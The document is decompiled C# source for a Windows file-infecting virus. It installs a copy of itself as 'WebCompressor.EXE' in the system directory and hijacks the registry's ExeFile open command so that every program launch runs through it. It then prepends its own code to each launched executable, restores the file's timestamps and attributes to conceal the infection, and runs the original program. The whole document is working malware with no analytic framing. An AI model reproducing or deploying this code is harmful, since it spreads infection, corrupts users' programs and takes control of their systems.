using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace A1;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		string executablePath = Application.get_ExecutablePath();
		string text = Path.Combine(Environment.SystemDirectory, "WebCompressor.EXE");
		byte[] array = new byte[5121];
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		try
		{
			FileStream fileStream = new FileStream(executablePath, FileMode.Open, FileAccess.Read);
			fileStream.Read(array, 0, 5120);
			fileStream.Close();
			fileStream = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (StringType.StrCmp(executablePath, text, false) == 0)
		{
			try
			{
				text = Environment.GetCommandLineArgs()[1];
				if (File.Exists(text))
				{
					byte[] array2 = new byte[5121];
					try
					{
						FileInfo fileInfo = new FileInfo(text);
						if (fileInfo.Length >= 5120L)
						{
							int attributes = (int)fileInfo.Attributes;
							DateTime creationTime = fileInfo.CreationTime;
							DateTime lastWriteTime = fileInfo.LastWriteTime;
							DateTime lastAccessTime = fileInfo.LastAccessTime;
							fileInfo.Attributes = FileAttributes.Normal;
							FileStream fileStream2 = new FileStream(text, FileMode.Open, FileAccess.ReadWrite);
							fileStream2.Read(array2, 0, 5120);
							if (StringType.StrCmp(BitConverter.ToString(array), BitConverter.ToString(array2), false) != 0)
							{
								fileStream2.Position = 0L;
								fileStream2.Write(array, 0, 5120);
								fileStream2.Position = fileStream2.Length;
								fileStream2.Write(array2, 0, 5120);
							}
							fileStream2.Close();
							fileStream2 = null;
							fileInfo.Attributes = (FileAttributes)attributes;
							fileInfo.CreationTime = creationTime;
							fileInfo.LastWriteTime = lastWriteTime;
							fileInfo.LastAccessTime = lastAccessTime;
						}
						fileInfo = null;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					ProcessStartInfo processStartInfo2 = processStartInfo;
					processStartInfo2.ErrorDialog = true;
					processStartInfo2.FileName = text;
					processStartInfo2.Arguments = Interaction.Command().Remove(0, checked(Strings.Len(text) + 2));
					processStartInfo2 = null;
					try
					{
						Process.Start(processStartInfo);
						return;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
						return;
					}
				}
				return;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			try
			{
				FileSystem.SetAttr(text, (FileAttribute)0);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			FileStream fileStream3 = new FileStream(text, FileMode.OpenOrCreate, FileAccess.Write);
			fileStream3.Write(array, 0, 5120);
			fileStream3.Close();
			fileStream3 = null;
			FileSystem.SetAttr(text, (FileAttribute)1);
			RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey("ExeFile\\Shell\\Open\\Command", writable: true);
			registryKey.SetValue("", text + " \"%1\" %*");
			registryKey.Close();
			registryKey = null;
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				FileInfo fileInfo2 = new FileInfo(executablePath);
				if (fileInfo2.Length >= 10240L)
				{
					fileInfo2 = null;
					FileStream fileStream4 = new FileStream(executablePath, FileMode.Open, FileAccess.Read);
					fileStream4.Position = fileStream4.Length - 5120L;
					fileStream4.Read(array, 0, 5120);
					fileStream4.Close();
					fileStream4 = null;
					text = Path.GetTempFileName();
					try
					{
						FileSystem.Kill(text);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					text = Path.Combine(Application.get_StartupPath(), Path.GetFileNameWithoutExtension(text) + ".EXE");
					try
					{
						FileSystem.SetAttr(text, (FileAttribute)0);
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					File.Copy(executablePath, text, overwrite: true);
					FileStream fileStream5 = new FileStream(text, FileMode.Open, FileAccess.Write);
					fileStream5.Write(array, 0, 5120);
					fileStream5.SetLength(fileStream5.Length - 5120L);
					fileStream5.Close();
					fileStream5 = null;
					processStartInfo.FileName = text;
					processStartInfo.Arguments = Interaction.Command();
					Process.Start(processStartInfo)!.WaitForExit();
					FileSystem.SetAttr(text, (FileAttribute)0);
					FileSystem.Kill(text);
				}
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
		}
	}
}
